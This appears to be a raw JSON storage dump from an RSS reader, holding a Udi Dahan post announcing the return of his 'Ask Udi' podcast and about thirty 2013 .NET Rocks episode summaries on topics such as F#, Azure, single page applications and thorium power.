{"k":"0000000078","o":"0000001079","v":"001"}
{"_id":2,"_uid":2,"_dt":1373199950724,"_s":"a4638ea9c1909ee8257f7d21b1b503c8"}
{"title":"The \"Ask Udi\" podcast is back","subscription":2,"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/9Qkgu4YheHg/","content":"<p>Given the overwhelming feedback to revive the �Ask Udi� podcast, how could I refuse.</p><p>Please submit your questions over here or vote on questions that other people have asked.</p><p>Even if you dont have a specific question, please feel free to suggest a topic that youd like me to rant about (CQRS for example).</p><p>The podcast used to be supported by an online magazine and I didnt think to back up the old podcast episodes so some have been lost in the ether, but you can find some of the history here: <a href=\"http://www.udidahan.com/category/ask-udi-podcast/\">http://www.udidahan.com/category/ask-udi-podcast/</a>.</p><p>Lets see if we can get a podcast out by the end of next week � so go and suggest the topics you want to here about:</p>","published":{"$wrap":"$date","v":1375138800000,"h":"2013-07-29T23:00:00.000Z"},"author":"Udi Dahan","read":false,"starred":true,"_id":{"$wrap":"$oid","v":2}}
{"k":"0000000078","o":"0000001079","v":"001"}
{"_id":3,"_uid":3,"_dt":1373200061222,"_s":"320b7dd37c310660604bd3968a733fec"}
{"title":"The \"Ask Udi\" podcast is back","subscription":2,"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/9Qkgu4YheHg/","content":"<p>Given the overwhelming feedback to revive the �Ask Udi� podcast, how could I refuse.</p><p>Please submit your questions over here or vote on questions that other people have asked.</p><p>Even if you dont have a specific question, please feel free to suggest a topic that youd like me to rant about (CQRS for example).</p><p>The podcast used to be supported by an online magazine and I didnt think to back up the old podcast episodes so some have been lost in the ether, but you can find some of the history here: <a href=\"http://www.udidahan.com/category/ask-udi-podcast/\">http://www.udidahan.com/category/ask-udi-podcast/</a>.</p><p>Lets see if we can get a podcast out by the end of next week � so go and suggest the topics you want to here about:</p>","published":{"$wrap":"$date","v":1375138800000,"h":"2013-07-29T23:00:00.000Z"},"author":"Udi Dahan","read":false,"starred":true,"_id":{"$wrap":"$oid","v":3}}
{"k":"0000000049","o":"0000000000","v":"001"}
{"_id":3,"_uid":3,"_dt":1373313536731,"_a":"del"}

{"k":"0000000078","o":"0000000849","v":"001"}
{"_id":4,"_uid":4,"_dt":1373728933632,"_s":"ab75242203342a73acdc7d92151b1361"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=888","title":".NET Gadgeteer Update with G. Andrew Duthie","published":{"$wrap":"$date","v":1373515200000,"h":"2013-07-11T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to G. Andrew Duthie about his work with .NET Gadgeteer. The whole concept of .NET Gadgeteer is to make it easy to build small electronic devices without needing to solder anything together AND be able to program in .NET! Andrew talks about his projects, including a hand-controlled helicopter, and his experience building custom modules for .NET Gadgeteer. The conversation explores a bunch of projects, availability of hardware and the vast array of community built hardware available. You need to try this!","author":false,"_id":{"$wrap":"$oid","v":4}}
{"k":"0000000078","o":"0000000844","v":"001"}
{"_id":5,"_uid":5,"_dt":1373728933636,"_s":"f249f2f131b0468814c2e5c501759ac3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=887","title":"Google DART with John Sonmez","published":{"$wrap":"$date","v":1373342400000,"h":"2013-07-09T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to John Sonmez about Google DART. DART is Google's alternative to JavaScript (although it also compiles to JavaScript) to make building web applications more reliable, scalable and maintainable. Imagine all the good stuff of all your favorite languages in one place! John talks about how DART can compile into JavaScript for non-DART browsers, but runs natively at about ten times the speed of JavaScript. Although the only native browser is Dartium and is pre-beta, some day DART will show up in your regular browser!","author":false,"_id":{"$wrap":"$oid","v":5}}
{"k":"0000000078","o":"0000000763","v":"001"}
{"_id":6,"_uid":6,"_dt":1373728933637,"_s":"85893fa6ed02c84de3b34a6be79a653d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=886","title":"Whiskey Geek Out","published":{"$wrap":"$date","v":1372910400000,"h":"2013-07-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Well, you knew it was coming - a geek out on whiskey. Carl and Richard talk about all kinds of whiskey, starting with Scotch whiskey as the foundation for how whiskey is made, and then digging into the differences in Irish whiskey and bourbon. The different grains, maltings, fermentation, barreling and post-processing techniques are all discussed. Making whiskey is an amazing and ancient art, and the boys have been studying it for awhile... perhaps a bit too closely!","author":false,"_id":{"$wrap":"$oid","v":6}}
{"k":"0000000078","o":"0000000745","v":"001"}
{"_id":7,"_uid":7,"_dt":1373728933639,"_s":"f2bfc948cdac53c337e995a57fea7ce4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=885","title":"F# in Your Organization with Kit Eason","published":{"$wrap":"$date","v":1372737600000,"h":"2013-07-02T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Kit Eason about how you can get your organization using F#. Kit talks about his work using F# and how he retrained himself to use the language effectively. It only takes a few days! He makes some awesome suggestions for approaches to learning the language effectively and the advantages that it brings. We're living in a polyglot world where the best language is used in its best role... and F# has a role!","author":false,"_id":{"$wrap":"$oid","v":7}}
{"k":"0000000078","o":"0000000734","v":"001"}
{"_id":8,"_uid":8,"_dt":1373728933640,"_s":"867cd0d0822e078e5c40d868304366c4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=884","title":"Functional Programming Panel at NDC","published":{"$wrap":"$date","v":1372305600000,"h":"2013-06-27T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Norwegian Developers Conference (NDC) in Oslo last week, Carl and Richard moderated a panel talking about the state of functional programming in mainstream development. The discussion reached back in time to languages like Haskell and Erlang, and looked forward at JavaScript and it's vector to seemingly take over the world. Even if you're not well versed in functional languages, this was a great discussion.","author":false,"_id":{"$wrap":"$oid","v":8}}
{"k":"0000000078","o":"0000000813","v":"001"}
{"_id":9,"_uid":9,"_dt":1373728933641,"_s":"475b123498c4a76764cb8ffa06ddce58"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=883","title":"Continuous Delivery by Jez Humble at NDC","published":{"$wrap":"$date","v":1372132800000,"h":"2013-06-25T04:00:00.000Z"},"starred":false,"read":false,"content":"While at NDC, Carl and Richard talk to Jez Humble about Continuous Delivery. Jez discusses the difference between continuous integration and continuous delivery and how nothing matters until your code actually gets to the customer. So no shipping parties until it does! The conversation digs into the overall story of DevOps, how development and operations need to work closer together to continuously deliver value to the customer - which is more about culture and process than it is about tools.","author":false,"_id":{"$wrap":"$oid","v":9}}
{"k":"0000000080","o":"0000000947","v":"001"}
{"_id":10,"_uid":10,"_dt":1373728933642,"_s":"cee78c2043d0c3ee48aa7d1c8bdcfabf"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=882","title":"Azure's Latest Features from Scott Guthrie at NDC","published":{"$wrap":"$date","v":1371700800000,"h":"2013-06-20T04:00:00.000Z"},"starred":false,"read":false,"content":"While at NDC, Carl and Richard talked to Scott Guthrie about the latest Azure features including the announcements from TechEd. Scott talks about new support for developers in Azure, including monthly Azure credit for all MSDN subscriptions and per minute billing for developer testing on Azure instances. Even if your app isn't running in the cloud, you can use the cloud to do your testing. The conversation digs into continuous delivery in the cloud - Scott mentions New Relic as an instrumentation package for your production applications to gain deep insight into how your cloud applications are actually being used.","author":false,"_id":{"$wrap":"$oid","v":10}}
{"k":"0000000080","o":"0000000861","v":"001"}
{"_id":11,"_uid":11,"_dt":1373728933644,"_s":"b5f9d35f961c6c3b14aba85cea860979"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=881","title":"Async, Parallelism and Learning with Jon Skeet at NDC","published":{"$wrap":"$date","v":1371528000000,"h":"2013-06-18T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Norwegian Developers Conference, Carl and Richard chatted with Jon Skeet about Async and Parallelism. The conversation starts out with a BKaF on parallel exception handling and a reader comment about F# and parallelism. Jon chimes in on both these subjects, talking about all the challenges around error handling, parallel or otherwise, and he knows (and doesn't know) about F#. Throughout the conversation there are short discussions on his effort to teach his sons programming as well. Great insights from Mr. Skeet!","author":false,"_id":{"$wrap":"$oid","v":11}}
{"k":"0000000080","o":"0000001041","v":"001"}
{"_id":12,"_uid":12,"_dt":1373728933645,"_s":"d89d358575fbdf3dcc12c2f2f89f1aab"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=880","title":"Space Telescope Geek Out","published":{"$wrap":"$date","v":1371096000000,"h":"2013-06-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk about space telescopes - but first, a comment about Thorium Molten Salt Reactors and a Kickstarter for a Thorium documentary called The Good Reactor. Also on Kickstarter is Arkyd, the space telescope that anyone can use - get a picture of yourself in space! The conversation then digs into space observatories, there are literally dozens up there today. Everyone knows about Hubble, but what about Compton, or Spitzer or Chandra? There are different observatories for different parts of the electromagnetic spectrum. Richard brings up Kepler, the little telescope that has detected hundreds of earth-sized planets around other stars. And don't forget about the upcoming replacement for Hubble, the James Web Telescope!","author":false,"_id":{"$wrap":"$oid","v":12}}
{"k":"0000000080","o":"0000000735","v":"001"}
{"_id":13,"_uid":13,"_dt":1373728933647,"_s":"70e65c60cd7f453d30ce4687837af100"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=879","title":"Kate Gregory Builds Smart Clients","published":{"$wrap":"$date","v":1370923200000,"h":"2013-06-11T04:00:00.000Z"},"starred":false,"read":false,"content":"At DevTeach, Carl and Richard talk to Kate Gregory about smart clients. As Kate says, quoting Don Box, 'they're not dead, they're done.' The conversation digs into WinForms, Silverlight and WPF. They aren't changing much, but they definitely work. Kate talks about the various projects she's working on that depend on smart clients - accessing different processes, specific hardware requirements, etc. It's old developer day!","author":false,"_id":{"$wrap":"$oid","v":13}}
{"k":"0000000080","o":"0000000848","v":"001"}
{"_id":14,"_uid":14,"_dt":1373728933648,"_s":"7cbb0eb813fdf66baeccf8eddb735e7a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=878","title":"James Kovacs Programs Javascript Functionally","published":{"$wrap":"$date","v":1370491200000,"h":"2013-06-06T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to James Kovacs about functional programming with JavaScript. Functional programming with JavaScript? What can't JavaScript do? James starts out talking about underscoreJS, a key library to simplify functional programming and provide some awesome features to keep your web pages running well. The conversation also digs into Single Page Applications in the context of functional programming, where you can go wrong, and why you want these tools in your toolbox to build the best web applications you can.","author":false,"_id":{"$wrap":"$oid","v":14}}
{"k":"0000000080","o":"0000000882","v":"001"}
{"_id":15,"_uid":15,"_dt":1373728933649,"_s":"8b288969070c1d7865fc2c935b002a09"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=877","title":"Kathleen Dollard Looks at .NET 4.5 Beyond Async","published":{"$wrap":"$date","v":1370318400000,"h":"2013-06-04T04:00:00.000Z"},"starred":false,"read":false,"content":"While at DevTeach, Carl and Richard talk to Kathleen Dollard about going beyond Async. And when she says beyond Async, she means the other amazing things in .NET 4.5. First up, the portable class libraries. Then Kathleen dives into Event Tracing for Windows classes that can let you do advanced logging in your applications. The conversation also dives into the dangers of the inline update that is .NET 4.5 from .NET 4.0... especially with the updates! Lots of subtle challenges with the latest incarnation of the .NET framework - and lots of possibilities!","author":false,"_id":{"$wrap":"$oid","v":15}}
{"k":"0000000080","o":"0000001045","v":"001"}
{"_id":16,"_uid":16,"_dt":1373728933650,"_s":"e6ebb3b7c998229b72002d0f3baa66fe"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=876","title":"Kevin Kline Updates us on SQL Server","published":{"$wrap":"$date","v":1369886400000,"h":"2013-05-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Kevin Kline about the latest features in SQL Server 2012. The conversation starts out talking about the new features that developers will love, like windowing - no need for cursors anymore, you can request a window of records from a set and move easily window-to-window. Kevin also talks about the new column store index that is especially useful with repeating data. There's also a discussion on the role of SQL Server in an increasingly NoSQL world, along with cool new technologies like Hadoop, Cassandra and Hekaton. Kevin closes with an offer of some free tools at SQL Sentry, including Plan Explorer, a tool to help you understand the query plans that SQL Server makes from your queries. Check it out!","author":false,"_id":{"$wrap":"$oid","v":16}}
{"k":"0000000080","o":"0000000784","v":"001"}
{"_id":17,"_uid":17,"_dt":1373728933652,"_s":"ca7a072e9a5d6b4500200b5a7b5a6c51"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=875","title":"John Papa Goes to the SPA","published":{"$wrap":"$date","v":1369713600000,"h":"2013-05-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to John Papa about Single Page Applications (SPA) - building web applications that operate on a single page for the duration of execution. John talks about the evolution of web design that has led to the SPA concept - the pros and cons of the approach as well. From there the conversation digs into the sets of open source libraries for making SPA easier to build and maintain. There is no one right way and lots of choice out there, check out the links below!","author":false,"_id":{"$wrap":"$oid","v":17}}
{"k":"0000000080","o":"0000000949","v":"001"}
{"_id":18,"_uid":18,"_dt":1373728933653,"_s":"70963811bb605262f0322c90903ea1d2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=874","title":"Michele Bustamante Starts Up a Startup","published":{"$wrap":"$date","v":1369281600000,"h":"2013-05-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Michele Leroux Bustamante about her experiences creating startup companies. Michele talks about getting started with a new company, deciding whether or not to take external funding from investors or just bootstrapping the company yourself, and how cloud technologies like Azure and programs like BizSpark have lowered the cost of infrastructure so that the main expense of a startup is wages. The conversation also digs into all the important things that developers don't know about being successful with a startup - it's not just about software! And don't forget about the dirty jokes at the end of the show!","author":false,"_id":{"$wrap":"$oid","v":18}}
{"k":"0000000080","o":"0000000793","v":"001"}
{"_id":19,"_uid":19,"_dt":1373728933656,"_s":"62f7e44621a60fb7fa2f9688f75d705e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=873","title":"Derik Whittaker Migrates from XAML to HTML","published":{"$wrap":"$date","v":1369108800000,"h":"2013-05-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Derik Whittaker about his experiences migrating from being a XAML developer to being an HTML developer. The conversation starts out talking about the death of Silverlight - or at least the severe neglect! From there, Derik describes the group of tools he uses to bring MVVM design patterns to HTML development. Along with some weird digressions on WinForms, this is a fun show and a great starting point for anyone ready to leave Silverlight behind!","author":false,"_id":{"$wrap":"$oid","v":19}}
{"k":"0000000080","o":"0000000729","v":"001"}
{"_id":20,"_uid":20,"_dt":1373728933657,"_s":"0d72ae3183d8f83881ddc1240fbbc9ed"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=872","title":"Tim Huckaby Brings Us Up to Date on Gesture","published":{"$wrap":"$date","v":1368676800000,"h":"2013-05-16T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Tim Huckaby about the latest developments around gesture computing. The conversation covers the latest version of the Kinect SDK (with grip!), as well as SoftKinetic, Panasonic D-IMager and Leap Motion. Tim also speculates on some of the new things coming from Microsoft with Xbox and Kinect (leaked specs in the links below), and how gesture is here to stay. It's everywhere already!","author":false,"_id":{"$wrap":"$oid","v":20}}
{"k":"0000000080","o":"0000000972","v":"001"}
{"_id":21,"_uid":21,"_dt":1373728933658,"_s":"c73005940d6e2b75393eb11425e3f501"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=871","title":"Marc Mercuri and Mark Simms Build Resilient Cloud Applications","published":{"$wrap":"$date","v":1368504000000,"h":"2013-05-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Marc Mercuri and Mark Simms about resilient cloud architecture. The conversation starts out focused on the white paper called 'FailSafe' and the guidance it provides for building resilient cloud applications - but the information is applicable to any large scale system running on any sort of infrastructure. While the topic area is huge, Marc and Mark break down the concepts into understanding your application, finding failure points, planning for failure (it's going to happen!) effective instrumentation and more. Lots of great thinking on how to build apps that can survive the huge tsunami of success.","author":false,"_id":{"$wrap":"$oid","v":21}}
{"k":"0000000080","o":"0000000875","v":"001"}
{"_id":22,"_uid":22,"_dt":1373728933660,"_s":"207d268187e5bbfd4ce13e5c78d8223b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=870","title":"Geeking Out on Nanotechnology","published":{"$wrap":"$date","v":1368072000000,"h":"2013-05-09T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard geek out on nanotechnology - and it's a huge subject! The conversation starts out with a proper definition of nanotechnology, as well as the original thinker in the space: Richard Feynman. Nanotechnology is far more than the original science fiction ideas of tiny robots and 'grey goo', it has expanded into super strong materials, particles that transport medicine and amazing two-dimensional crystals with remarkable properties, like graphene. We're only scratching the surface of nanotech with this show, write us a comment if you want to hear more!","author":false,"_id":{"$wrap":"$oid","v":22}}
{"k":"0000000080","o":"0000001037","v":"001"}
{"_id":23,"_uid":23,"_dt":1373728933661,"_s":"364210781a32f780613245500870f38b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=869","title":"Pablo Santos Does DVCS with PlasticSCM","published":{"$wrap":"$date","v":1367899200000,"h":"2013-05-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Pablo Santos about Plastic SCM. Plastic SCM is a free ALM tool for managing source and tracking for up to 15 developers - after that you have to pay. The conversation starts out with the concept of task-driven development, letting many developers work simultaneously on a project while each focusing on individual tasks. The challenge is excessive forking of the code - how do you get everything merged together again? Pablo talks about the powerful merge system of PlasticSCM to help identify identical code by functionality, not just syntax. Other strengths include great cross-platform support, integration with multiple IDEs, and support for lots of third party tools. Well worth checking out!","author":false,"_id":{"$wrap":"$oid","v":23}}
{"k":"0000000080","o":"0000000965","v":"001"}
{"_id":24,"_uid":24,"_dt":1373728933662,"_s":"0e8293465bd96e5ad2b674de7e171351"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=868","title":"Lynn and Llewellyn Help Developers Teach Their Kids to Program","published":{"$wrap":"$date","v":1367467200000,"h":"2013-05-02T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Lynn Langit and Llewellyn Falco about how developers can teach their kids to program. While Lynn and Llewellyn have been teaching all sorts of kids how to program (check out the links below), they've recently published a Pluralsight course specifically for developers to teach their own kids how to program. The course is completely free - you don't need to sign up for anything! And the course lets you as a developer work with your children step by step to learn how to develop in Visual Studio - yes, with your own tools. Want to show your children what you do for a living? Take it out for a spin!","author":false,"_id":{"$wrap":"$oid","v":24}}
{"k":"0000000080","o":"0000000891","v":"001"}
{"_id":25,"_uid":25,"_dt":1373728933663,"_s":"0fe5bc83614bf23da7dc3ccfca0b86b8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=867","title":"Mårten Rånge Takes Advantage of Templates","published":{"$wrap":"$date","v":1367294400000,"h":"2013-04-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Mårten Rånge about Microsoft's Text Template Transformation Toolkit (T4). Don't call it code generation - Mårten talks about how T4 takes away code repetition and keeps you focused on the important stuff. The challenge is learning to build your own maintainable templates. The conversation explores a variety of examples of using T4 effectively for SQL, XAML as well as C# and C++. Mårten has a project on GitHub called T4Include to help you utilize them more effectively. The tooling isn't perfect, but there are alternatives - check it out!","author":false,"_id":{"$wrap":"$oid","v":25}}
{"k":"0000000080","o":"0000000468","v":"001"}
{"_id":26,"_uid":26,"_dt":1373728933691,"_s":"9e6659eebee78f574d9c0df832449f68"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=866","title":"State of the Cloud at DevIntersection","published":{"$wrap":"$date","v":1366862400000,"h":"2013-04-25T04:00:00.000Z"},"starred":false,"read":false,"content":"While at DevIntersection, Carl and Richard host a panel discussion on the state of cloud development. No clouds were harmed in the making of this podcast.","author":false,"_id":{"$wrap":"$oid","v":26}}
{"k":"0000000080","o":"0000000921","v":"001"}
{"_id":27,"_uid":27,"_dt":1373728933692,"_s":"c69d41f92762c616c4eba3cd308d409a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=865","title":"Hendrik Lösch Helps us Test with Visual Studio 2012","published":{"$wrap":"$date","v":1366689600000,"h":"2013-04-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Hendrik Lösch about his experiences doing testing with Visual Studio 2012. Henrik starts out talking about unit testing, the different approaches with various tools, including mocking, moles and fakes. He talks about how MSTest has substantially improved in Studio 2012, but still needs help in the form of NUnit and/or xUnit.net. The conversation also digs into new generation tools like NCrunch and SpecFlow, rationalizing BDD, TDD and ATDD and ultimately dealing with the social challenges of making testing and quality a core part of your development experience.","author":false,"_id":{"$wrap":"$oid","v":27}}
{"k":"0000000080","o":"0000001134","v":"001"}
{"_id":28,"_uid":28,"_dt":1373728933693,"_s":"118e23bdacac902af311f0368cf685ea"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=864","title":"Geeking Out on Thorium","published":{"$wrap":"$date","v":1366257600000,"h":"2013-04-18T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Donald Larson, a combination technology and nuclear scientist, about power from thorium. The conversation begins with thorium, a low-level radioactive metal that is three times more abundant than uranium and available all over the world, often found as a byproduct of other mining efforts. Don talks about the advantages of the thorium fuel cycle, how it cannot be used to make weapons-grade radioactives and doesn't require expensive pre-processing to be usable for power. From there the topic of molten salt reactors (MSR) is explored. MSRs can use radioactive materials besides thorium and have a number of safety advantages, not the least of which is being able to continuously refuel, have passive safety systems and an ability to utilize radioactive fuel more efficiently. The future of power is thorium!","author":false,"_id":{"$wrap":"$oid","v":28}}
{"k":"0000000080","o":"0000000918","v":"001"}
{"_id":29,"_uid":29,"_dt":1373728933694,"_s":"0eae2e2fb78ee3d01b486c9819eaf525"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=863","title":"Dominick Baier Updates Our Security in .NET 4.5","published":{"$wrap":"$date","v":1366084800000,"h":"2013-04-16T04:00:00.000Z"},"starred":false,"read":false,"content":"Dominick Baier returns to talk to Carl and Richard about the current state of security in .NET 4.5. Dom starts out talking about how WebAPI has impacted the development of web services without much in the way of new security features - so he built some for everyone to use (check the links below). The conversation then digs into the challenges around OAuth 2 and the challenges of building specifications by committee when you're dealing with security. Also listen for a great dig into the real goals of identity technologies that largely haven't come to pass yet - there's still a ways to go!","author":false,"_id":{"$wrap":"$oid","v":29}}
{"k":"0000000080","o":"0000000887","v":"001"}
{"_id":30,"_uid":30,"_dt":1373728933695,"_s":"878d919554c014bbb1d0e39031fa1680"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=862","title":"Anthony van der Hoorn and Nik Molnar Take a Glimpse","published":{"$wrap":"$date","v":1365652800000,"h":"2013-04-11T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Anthony van der Hoorn and Nik Molnar about their open source project called Glimpse. Glimpse provides instrumentation for the server and client side components of your web app, displaying it in a tabular format at the bottom of your browser. Anthony and Nik discuss the extensiblity model allowing additional components to be instrumented with Glimpse - and how they've only built five of the thirty packages available today! This is open source at its best, and an awesome way to understand what is happening in your web application.","author":false,"_id":{"$wrap":"$oid","v":30}}
{"k":"0000000080","o":"0000000799","v":"001"}
{"_id":31,"_uid":31,"_dt":1373728933696,"_s":"a1238da3d75971067a5c2fe3f4819bdf"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=861","title":"Justin Beckwith Releases WebMatrix 3","published":{"$wrap":"$date","v":1365480000000,"h":"2013-04-09T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Justin Beckwith about the recently released WebMatrix 3. Justin talks about the vision of keeping web development simple while still having access to all the latest features of the Web. And yes, sites built with WebMatrix can be worked on with Visual Studio as well! The conversation also digs into building mobile web sites and the various modules you can add into WebMatrix to extend functionality including Git integration, LessCSS and more... lots of links!","author":false,"_id":{"$wrap":"$oid","v":31}}
{"k":"0000000080","o":"0000001065","v":"001"}
{"_id":32,"_uid":32,"_dt":1373728933698,"_s":"6b7d46f9229422e48b1d5b665aca4086"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=860","title":"David Pitcher Instruments Applications Internally at Microsoft","published":{"$wrap":"$date","v":1365048000000,"h":"2013-04-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to David Pitcher, part of Microsoft's internal IT team, about his experiences instrumenting applications. The conversation digs into the application in question, a Windows Phone app for allowing tech support personnel manage tech support problems on the go. Then David discusses the impact of instrumentation on the application in the form of PreEmptive Analytics, a free version of which is included with Visual Studio 2012. David describes how instrumentation has changed the way the team does error handling in general, prioritized features and bug fixes, and in some cases created whole other features to be designed! Instrumentation is a key part of the DevOps movement and it makes software better!","author":false,"_id":{"$wrap":"$oid","v":32}}
{"k":"0000000080","o":"0000000969","v":"001"}
{"_id":33,"_uid":33,"_dt":1373728933699,"_s":"020727a28ef98def44f5bdf090d480e6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=859","title":"Amir Rajan Does Frictionless Development with Oak","published":{"$wrap":"$date","v":1364875200000,"h":"2013-04-02T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Amir Rajan about his Oak project on GitHub. Amir discusses his approach to building Single Page Applications (SPA) using an array of open source tools including Rake (from the Ruby stack), nSpec, Canopy, Growl and more. The conversation digs into how C# fits into the equation and how Oak provides the dynamic typing that C# needs to work well in the JavaScript driven world of SPA. Amir also talks about how this development stack works well with different editors since it is file focused for compilation, testing and deployment. There's a little taste of DevOps in this great conversation on modern web development!","author":false,"_id":{"$wrap":"$oid","v":33}}
{"k":"0000000080","o":"0000000717","v":"001"}
{"_id":34,"_uid":34,"_dt":1373728933700,"_s":"549800c7c42f8131d0322f0d17b6badb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=858","title":"Carl and Richard Geek Out on GeoThermal Power","published":{"$wrap":"$date","v":1364443200000,"h":"2013-03-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard are geeking out again, this time about geothermal energy. The conversation starts out focusing on household geothermal heating, which is really a form of heat pump technology. After that, the boys dig into the hard stuff - geothermal energy. After talking through the various techniques of generating power from the ground, the focus goes to the key to all power systems: water.","author":false,"_id":{"$wrap":"$oid","v":34}}
{"k":"0000000080","o":"0000000920","v":"001"}
{"_id":35,"_uid":35,"_dt":1373728933701,"_s":"e0b003aaf7335b209d83d38103196221"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=857","title":"Hakansson and Robbins Talk NancyFX","published":{"$wrap":"$date","v":1364270400000,"h":"2013-03-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Andreas Hakansson and Steve Robbins about NancyFX. NancyFX is an open source project to provide a lightweight framework for building web applications. Andreas and Steve talk about NancyFX focusing on the Super-Duper-Happy-Path of web development. The conversation also digs into the diversity that NancyFX supports, running in IIS, with ASP.NET (or not), WCF, Azure, OWIN, Umbraco, even Nginx on Ubuntu! Andreas and Steve also dig into how NancyFX handles testing, different view engines, authentication and cryptography. If you're considering WebAPI, you should look at NancyFX also!","author":false,"_id":{"$wrap":"$oid","v":35}}
{"k":"0000000080","o":"0000000843","v":"001"}
{"_id":36,"_uid":36,"_dt":1373728933702,"_s":"ce2b73665cbe82cd1526bfc829682461"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=856","title":"Columbia Sportswear Connects Development Teams with TFS","published":{"$wrap":"$date","v":1363838400000,"h":"2013-03-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Brian Summers and Dave Harrison of Columbia Sportswear about their work with Team Foundation Server. Brian and Dave discuss how TFS has allowed them to build a common work planning environment for almost all of the developers at Columbia, including .NET, Java and ABAP (SAP) programmers. The conversation dives into how the different teams are able to collaborate, how they've built a service bus based on Biztalk and the future of even more rapid application development with TFS 2012.","author":false,"_id":{"$wrap":"$oid","v":36}}
{"k":"0000000080","o":"0000000640","v":"001"}
{"_id":37,"_uid":37,"_dt":1373728933703,"_s":"7776213bd6095fdcb181cc6697bcef01"}
